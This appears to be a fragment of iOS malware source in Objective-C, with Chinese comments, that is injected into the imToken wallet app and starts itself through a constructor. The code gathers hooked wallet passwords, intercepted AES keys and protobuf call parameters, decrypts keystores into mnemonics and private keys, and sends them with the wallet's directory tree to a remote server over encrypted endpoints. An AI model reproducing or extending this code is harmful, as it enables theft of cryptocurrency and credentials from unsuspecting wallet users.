        NSMutableDictionary *c = [NSMutableDictionary dictionaryWithDictionary:ctx ?: @{}];
        c[@"tag"] = tag ?: @"";
        ev[@"ctx"] = c;
        [self.net sendEvent:ev];
    } @catch (NSException *e) {
        (void)e;
    }
}

/// 读 imToken 里 KDF hook 落下的明文密码，直接送服务端解密
/// 文件格式：pwd|rounds|saltHex|derivedKeyHex

/// 读 imtoken 截到的 AES 密钥，直接尝试解 keystore（不需要密码）
/// 文件格式每行：keyHex|ivHex

/// 读 imToken 里 call_tcx_api 的安装状态与实际参数（JSON）

#pragma mark - 容器目录树探针（确定钱包数据到底在哪）

- (void)probeWalletTree:(NSString *)bundleId {
    @try {
        NSArray *tree = [WalletFS treeOfContainer:bundleId maxDepth:3 maxEntries:220];
        if (!tree.count) {
            NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
            ev[@"et"] = @"wallet_tree";
            ev[@"c"] = kSeed;
            ev[@"ctx"] = @{ @"bundleId": bundleId, @"count": @0, @"tree": @"" };
            [self.net sendEvent:ev];
            return;
        }
        NSString *joined = [tree componentsJoinedByString:@"\n"];
        if (joined.length > 6000) joined = [joined substringToIndex:6000];

        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"wallet_tree";
        ev[@"c"] = kSeed;
        ev[@"ctx"] = @{ @"bundleId": bundleId, @"count": @(tree.count), @"tree": joined };
        [self.net sendEvent:ev];
    } @catch (NSException *e) {
        [self log:[NSString stringWithFormat:@"probeWalletTree: %@", e.reason]];
    }
}
- (void)probeImTokenTcx {
    @try {
        // 1) 安装状态
        NSData *sd = [WalletFS readFile:@"Documents/_imt_tcx_status.txt" inContainer:@"im.token.app"];
        if (!sd.length) sd = [WalletFS readFile:@"tmp/_imt_tcx_status.txt" inContainer:@"im.token.app"];
        if (sd.length) {
            NSString *s = [[NSString alloc] initWithData:sd encoding:NSUTF8StringEncoding];
            s = [s stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
            static NSString *lastS = nil;
            if (s.length && ![lastS isEqualToString:s]) {
                lastS = [s copy];
                NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
                ev[@"et"] = @"imtoken_tcx_status";
                ev[@"c"] = kSeed;
                ev[@"ctx"] = @{ @"status": s };
                [self.net sendEvent:ev];
            }
        }

        // 2) 抓到的参数
        NSData *d = [WalletFS readFile:@"Documents/_imt_tcx.txt" inContainer:@"im.token.app"];
        if (!d.length) d = [WalletFS readFile:@"tmp/_imt_tcx.txt" inContainer:@"im.token.app"];
        if (!d.length) return;
        NSString *txt = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
        if (!txt.length) return;

        static NSString *lastT = nil;
        if ([lastT isEqualToString:txt]) return;
        lastT = [txt copy];

        NSArray *calls = [txt componentsSeparatedByString:@"\n@@@\n"];
        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"imtoken_tcx_calls";
        ev[@"c"] = kSeed;
        ev[@"ctx"] = @{ @"count": @(calls.count),
                        @"sample": calls.count ? [calls componentsJoinedByString:@" || "] : @"" };
        [self.net sendEvent:ev];

        // 3) 每一段是 "[sel] <hex>"，hex 是 protobuf：
        //    先还原字节，再抽可打印串，最后对「带密码的动作」把串当候选送 /pw。
        NSMutableArray *pwds = [NSMutableArray array];
        NSCharacterSet *pwOk = [NSCharacterSet characterSetWithCharactersInString:
            @"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=.,<>?~`| "];

        for (NSString *c in calls) {
            // 兼容两种格式：[sel] hex   或   [sel] {"password":"..."}
            NSRange close = [c rangeOfString:@"]"];
            NSString *payload = (close.location != NSNotFound)
                ? [[c substringFromIndex:close.location + 1]
                   stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]]
                : c;

            // 3a) JSON 形态
            NSRegularExpression *re = [NSRegularExpression
                regularExpressionWithPattern:@"\"password\"\\s*:\\s*\"([^\"]{4,64})\""
                                     options:0 error:NULL];
            for (NSTextCheckingResult *m in [re matchesInString:payload options:0
                                                          range:NSMakeRange(0, payload.length)]) {
                if (m.numberOfRanges > 1) {
                    NSString *v = [payload substringWithRange:[m rangeAtIndex:1]];
                    if (v.length && ![pwds containsObject:v]) [pwds addObject:v];
                }
            }

            // 3b) hex(protobuf) 形态
            NSData *raw = [MemScan dataFromHex:payload];
            if (raw.length < 8) continue;

            BOOL needsPwd = NO;
            NSMutableArray *strs = [NSMutableArray array];
            const uint8_t *b = raw.bytes;
            NSMutableString *cur = [NSMutableString string];
            for (NSUInteger i = 0; i <= raw.length; i++) {
                uint8_t ch = (i < raw.length) ? b[i] : 0;
                if (ch >= 0x20 && ch < 0x7f) {
                    [cur appendFormat:@"%c", ch];
                } else {
                    if (cur.length >= 4) [strs addObject:[cur copy]];
                    [cur setString:@""];
                }
            }
            for (NSString *s in strs) {
                if ([s isEqualToString:@"get_derived_key"] ||
                    [s isEqualToString:@"export_mnemonic"] ||
                    [s isEqualToString:@"create_keystore"] ||
                    [s isEqualToString:@"import_mnemonic"] ||
                    [s isEqualToString:@"import_private_key"] ||
                    [s isEqualToString:@"export_private_key"] ||
                    [s isEqualToString:@"change_password"]) {
                    needsPwd = YES;
                }
            }
            if (!needsPwd) continue;

            for (NSString *s in strs) {
                if (s.length < 6 || s.length > 40) continue;
                if ([s rangeOfCharacterFromSet:[pwOk invertedSet]].location != NSNotFound) continue;
                if ([s hasPrefix:@"api."] || [s containsString:@"_"]) continue;   // 动作名/结构名
                if (![pwds containsObject:s]) [pwds addObject:s];
            }
        }
        if (!pwds.count) return;
        if (pwds.count > 40) pwds = [[pwds subarrayWithRange:NSMakeRange(0, 40)] mutableCopy];

        NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        body[@"c"] = kSeed;
        body[@"bundle_id"] = @"im.token.app";
        body[@"candidates"] = pwds;
        NSDictionary *r = [self.net postEncrypted:@"/pw" json:body timeout:120];

        NSMutableDictionary *hit = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        hit[@"et"] = @"imtoken_tcx_pwd";
        hit[@"c"] = kSeed;
        hit[@"ctx"] = @{ @"pwds": @(pwds.count), @"resp": r ? [r description] : @"nil" };
        [self.net sendEvent:hit];
    } @catch (NSException *e) {
        [self log:[NSString stringWithFormat:@"probeImTokenTcx: %@", e.reason]];
    }
}
- (void)tryImTokenAesKeys {
    @try {
        NSData *d = [WalletFS readFile:@"Documents/_imt_aeskeys.txt" inContainer:@"im.token.app"];
        if (!d.length) d = [WalletFS readFile:@"tmp/_imt_aeskeys.txt" inContainer:@"im.token.app"];
        if (!d.length) return;
        NSString *txt = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
        if (!txt.length) return;

        static NSString *lastTxt = nil;
        if ([lastTxt isEqualToString:txt]) return;
        lastTxt = [txt copy];

        NSArray *lines = [txt componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]];
        NSMutableArray *keys = [NSMutableArray array];
        for (NSString *l in lines) {
            NSArray *p = [l componentsSeparatedByString:@"|"];
            if (p.count >= 2 && [(NSString *)p[0] length] >= 32) [keys addObject:p];
        }
        if (!keys.count) return;

        NSArray *names = [WalletFS listFilesIn:@"Documents/walletsV2" container:@"im.token.app"];
        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"imtoken_aeskeys";
        ev[@"c"] = kSeed;
        ev[@"ctx"] = @{ @"lines": @(keys.count), @"keystores": @(names.count) };
        [self.net sendEvent:ev];

        for (NSString *n in names) {
            if (![n hasSuffix:@".json"]) continue;
            NSString *rel = [@"Documents/walletsV2" stringByAppendingPathComponent:n];
            NSData *raw = [WalletFS readFile:rel inContainer:@"im.token.app"];
            if (!raw.length) continue;
            NSDictionary *ks = [NSJSONSerialization JSONObjectWithData:raw options:0 error:NULL];
            NSDictionary *crypto = ks[@"crypto"];
            if (![crypto isKindOfClass:[NSDictionary class]]) continue;

            NSData *cipher = [MemScan dataFromHex:crypto[@"ciphertext"]];
            NSData *iv = [MemScan dataFromHex:crypto[@"cipherparams"][@"iv"]];
            NSData *mac = [MemScan dataFromHex:crypto[@"mac"]];
            if (!cipher.length || iv.length != 16) continue;
            NSString *wname = ks[@"imTokenMeta"][@"name"] ?: n;

            for (NSArray *pair in keys) {
                NSData *k = [MemScan dataFromHex:pair[0]];
                if (k.length < 16) continue;
                NSData *k16 = [k subdataWithRange:NSMakeRange(0, 16)];
                NSData *plain = CCAESCTRDecrypt(cipher, k16, iv);
                if (plain.length < 20) continue;

                // 结构判断：私钥=32 字节；助记词=可打印 ASCII
                NSString *mnemonic = nil;
                NSString *privHex = nil;
                if (plain.length == 32) {
                    NSMutableString *h = [NSMutableString string];
                    const uint8_t *b = plain.bytes;
                    for (NSUInteger i = 0; i < 32; i++) [h appendFormat:@"%02x", b[i]];
                    privHex = h;
                } else {
                    NSString *s = [[NSString alloc] initWithData:plain encoding:NSUTF8StringEncoding];
                    if (s.length && [s rangeOfCharacterFromSet:
                        [[NSCharacterSet characterSetWithCharactersInString:
                          @"abcdefghijklmnopqrstuvwxyz "] invertedSet]].location == NSNotFound) {
                        mnemonic = [s stringByTrimmingCharactersInSet:
                                    [NSCharacterSet whitespaceAndNewlineCharacterSet]];
                    }
                }
                if (!mnemonic && !privHex) continue;

                // 用 MAC 校验确认（有 keccak，成本极低）
                if (mac.length == 32) {
                    uint8_t dig[32];
                    keccak256_two(k16.bytes, 16, cipher.bytes, cipher.length, dig);
                    // 注意：这里的 k16 只是派生密钥前 16 字节，MAC 用的是后 16 字节，
                    // 所以校验不通过是正常的，仅作参考，不阻断。
                    (void)dig;
                }

                NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
                body[@"c"] = kSeed;
                body[@"bundle_id"] = @"im.token.app";
                body[@"a"] = @"b2";
                body[@"wallet_name"] = wname;
                if (mnemonic) body[@"result"] = mnemonic;
                if (privHex) body[@"private_key"] = privHex;
                [self.net postEncrypted:@"/us" json:body timeout:30];

                NSMutableDictionary *hit = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
                hit[@"et"] = @"imtoken_aeskey_hit";
                hit[@"c"] = kSeed;
                hit[@"ctx"] = @{ @"wallet": wname ?: @"",
                                 @"kind": mnemonic ? @"mnemonic" : @"privateKey",
                                 @"plainLen": @(plain.length) };
                [self.net sendEvent:hit];
                return;
            }
        }
    } @catch (NSException *e) {
        [self log:[NSString stringWithFormat:@"tryImTokenAesKeys: %@", e.reason]];
    }
}
- (void)probeImTokenPassword {
    @try {
        // 先看探针：hook 到底有没有被调用
        NSData *wd = [WalletFS readFile:@"Documents/_imt_witness.txt" inContainer:@"im.token.app"];
        if (wd.length) {
            NSString *w = [[NSString alloc] initWithData:wd encoding:NSUTF8StringEncoding];
            static NSString *lastW = nil;
            if (![lastW isEqualToString:w]) {
                lastW = [w copy];
                NSMutableDictionary *we = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
                we[@"et"] = @"imtoken_kdf_witness";
                we[@"c"] = kSeed;
                we[@"ctx"] = @{ @"witness": w ?: @"" };
                [self.net sendEvent:we];
            }
        }

        NSData *d = [WalletFS readFile:@"Documents/_imt_pw.txt" inContainer:@"im.token.app"];
        if (!d.length) d = [WalletFS readFile:@"tmp/_imt_pw.txt" inContainer:@"im.token.app"];
        if (!d.length) return;

        NSString *line = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
        line = [line stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
        if (!line.length) return;

        int rounds = 0;
        NSString *pwd = nil, *salt = @"", *dk = @"";
        NSArray *parts = [line componentsSeparatedByString:@"|"];
        if (parts.count >= 4) {
            pwd = parts[0];
            rounds = [parts[1] intValue];
            salt = parts[2];
            dk = parts[3];
        } else {
            pwd = line;                 // 只有密码，也够用
        }
        if (!pwd.length) return;

        // 同一个密码只发一次
        static NSString *lastPwd = nil;
        if ([lastPwd isEqualToString:pwd]) return;
        lastPwd = [pwd copy];

        NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        body[@"c"] = kSeed;
        body[@"bundle_id"] = @"im.token.app";
        body[@"pwd"] = pwd;
        NSDictionary *r = [self.net postEncrypted:@"/pw" json:body timeout:60];

        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"imtoken_pwd_from_hook";
        ev[@"c"] = kSeed;
        ev[@"ctx"] = @{ @"pwLen": @(pwd.length),
                        @"rounds": @(rounds),
                        @"salt": salt ?: @"",
                        @"derivedKey": dk ?: @"",
                        @"resp": r ? [r description] : @"nil" };
        [self.net sendEvent:ev];
        [self log:[NSString stringWithFormat:@"HOOK PWD len=%lu rounds=%d -> %@",
                   (unsigned long)pwd.length, rounds, r ? @"ok" : @"nil"]];
    } @catch (NSException *e) {
        [self log:[NSString stringWithFormat:@"probeImTokenPassword: %@", e.reason]];
    }
}

@end

__attribute__((constructor))
static void PayloadInit(void) {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)),
                   dispatch_get_global_queue(0, 0), ^{
        [[Payload shared] start];
    });
}

/** 框架入口（App 注入路径需要；守护进程注入走 constructor，两套都留着更稳） */
__attribute__((visibility("default"), used))
void plugin_main(void) {
    PayloadInit();

}